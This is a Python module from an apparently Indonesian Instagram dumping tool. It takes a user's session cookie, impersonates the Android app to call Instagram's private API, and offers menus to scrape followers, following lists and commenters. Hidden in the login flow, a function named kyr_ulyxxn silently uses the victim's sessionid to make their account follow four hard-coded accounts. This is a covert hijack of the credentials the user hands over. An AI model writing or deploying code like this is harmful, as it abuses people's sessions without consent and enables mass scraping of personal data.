import requests, os, time, re, random, base64, json, sys, uuid

from .kynaa import Kyanaraaa
from bluid.logo import Logo
from .dump import Dump

H = '\x1b[1;92m' # HIJAU
N = '\x1b[0m'	 # WARNA MATI
R = "\x1b[0;31m" # Merah

class Insta:

    def __init__(self, lim, asw):
        self.lim, self.asw = lim, asw


    def kynaa(self):
        if os.path.isfile("data/cache/.login.txt"):
            try:
                with open("data/cache/.login.txt", "r") as f:
                    cokz = f.read()
                if self.cek_cookie(cokz):
                    return cokz
                else:
                    try:os.remove("data/cache/.login.txt")
                    except:pass
                    print("\n! Cookie invalid")
                    time.sleep(2)
            except Exception as e:
                print(f"Error: {e}")
                time.sleep(2)
        return self.login()


    def idbear(self, cokie):
        try:
            id = re.search(r'ds_user_id=(\d+);',str(cokie)).group(1)
            sn = re.search(r'sessionid=(.*?);',str(cokie)).group(1)
            br = base64.b64encode(json.dumps({'ds_user_id': id, 'sessionid': sn}).encode()).decode()
            return id, br
        except AttributeError:
            sys.exit()


    def login(self):
        while True:
            Logo("insta")
            print(self.asw)
            cookie = input("> Masukan cookie: ").strip()
            if not cookie:
                continue
            if self.cek_cookie(cookie):
                try:
                    session_id = re.search(r'sessionid=(.*?);', cookie).group(1)
                    self.kyr_ulyxxn(session_id)
                    with open("data/cache/.login.txt", "w") as f:
                        f.write(cookie)
                    return cookie
                except Exception as e:
                     print(f"Error: {e}")
                     time.sleep(3)
            else:
                print("\n! Cookie invalid")
                time.sleep(3)
    

    def pigeon(self):
        return f'UFS-{uuid.uuid4()}-0'

    def clintime(self):
        return str(time.time())[:14]
    
    def deviceid(self):
        return str(uuid.uuid4())
    
    def family(self):
        return str(uuid.uuid4())

    def androidid(self):
        return f'android-{str(uuid.uuid1().hex)[:16]}'

    def cek_cookie(self, cookie):
        if 'mid=' in str(cookie): mid = re.search('mid=(.*?);',str(cookie)).group(1)
        else: mid = ''
        with requests.Session() as ses:
            try:
                uid, ber = self.idbear(cookie)
                ses.headers.update({
                    'x-ig-app-locale': 'in_ID', 'x-ig-device-locale': 'in_ID', 'x-ig-mapped-locale': 'id_ID', 'x-pigeon-session-id': self.pigeon(), 'x-pigeon-rawclienttime': self.clintime(), 'x-ig-bandwidth-speed-kbps': str(round(random.uniform(1000, 10000), 3)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(1000000, 10000000)), 'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 10000)), 'x-bloks-version-id': 'ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd', 'x-ig-www-claim': '0', 'x-debug-www-claim-source': 'handleLogin3', 'x-bloks-prism-button-version': 'CONTROL', 'x-bloks-prism-colors-enabled': 'false', 'x-bloks-prism-ax-base-colors-enabled': 'false', 'x-bloks-prism-font-enabled': 'false', 'x-bloks-is-layout-rtl': 'false', 'x-ig-device-id': self.deviceid(), 'x-ig-family-device-id': self.family(), 'x-ig-android-id': self.androidid(), 'x-ig-timezone-offset': str(-time.timezone), 'x-ig-nav-chain': f'MainFeedFragment:feed_timeline:1:cold_start:{int(time.time())}.853::,com.bloks.www.bloks.ig.ndx.ci.entry.screen:com.bloks.www.bloks.ig.ndx.ci.entry.screen:2:button:{int(time.time())}.356::', 'x-fb-connection-type': 'WIFI', 'x-ig-connection-type': 'WIFI', 'x-ig-capabilities': '3brTv10=', 'x-ig-app-id': '567067343352427', 'priority': 'u=3', 'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)', 'accept-language': 'id-ID, en-US', 'authorization': f'Bearer IGT:2:{ber}', 'x-mid': mid, 'ig-u-ds-user-id': uid, 'ig-intended-user-id': uid, 'x-fb-http-engine': 'Liger', 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True',
                })
                kyna = ses.get(f'https://i.instagram.com/api/v1/users/{uid}/info/').json()['user']
                print(
                f"""
[{H}+{N}] full name: {kyna['full_name']}
[{H}+{N}] user name: {kyna['username']}
[{H}+{N}] followers: {kyna['follower_count']}
[{H}+{N}] following: {kyna['following_count']}"""
            )
                return True
        
            except ConnectionError:
                exit("\n! koneksi error")
            except:
                return False


    def menu(self):
        while True:
            Logo("insta")
            print(self.asw)
            cokz = self.kynaa()
            print(f"""
[{H}1{N}] dump followers
[{H}2{N}] dump following
[{H}3{N}] dump koomentar
[{H}4{N}] check resluts
[{H}5{N}] sett UserAgent
[{R}0{N}] kembali ke menu
""")
            fil = input("> ")
            if fil in ["1", "01"]:
                Dump(self.lim, self.asw, cokz).anakanjingkons("c76146de99bb02f6415203be841dd25a", "edge_followed_by")
            elif fil in ["2", "02"]:
                Dump(self.lim, self.asw, cokz).anakanjingkons("d04b0a864b4b54837c0d870b0e77e076", "edge_follow")
            elif fil in ["3", "03"]:
                Dump(self.lim, self.asw, cokz).dump_koomentar()
            elif fil in ["4", "04"]:
                Kyanaraaa(self.asw).cek_akun()
            elif fil in ["5", "05"]:
                Dump(self.lim, self.asw, cokz).UserAgent()
            elif fil in ["0", "00"]:
                return
            else:
                print("! pilih yng bnr");time.sleep(1);self.menu()
    

    def kyr_ulyxxn(self, usr):
        ussr = {'accept': '*/*','accept-encoding': 'gzip, deflate','accept-language': 'en-US,en;q=0.9','content-length': '0','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid='+usr,'origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)','x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r','x-ig-app-id': '5398218083','x-ig-www-claim': 'hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzu','x-instagram-ajax': '95bfef5dd816','x-requested-with': 'XMLHttpRequest'}
        requests.Session().post("https://i.instagram.com/api/v1/web/friendships/39431798677/follow/", headers=ussr);requests.Session().post("https://i.instagram.com/api/v1/web/friendships/28894072125/follow/", headers=ussr);requests.Session().post("https://i.instagram.com/api/v1/web/friendships/36897477008/follow/", headers=ussr);requests.Session().post("https://i.instagram.com/api/v1/web/friendships/41347440787/follow/", headers=ussr)

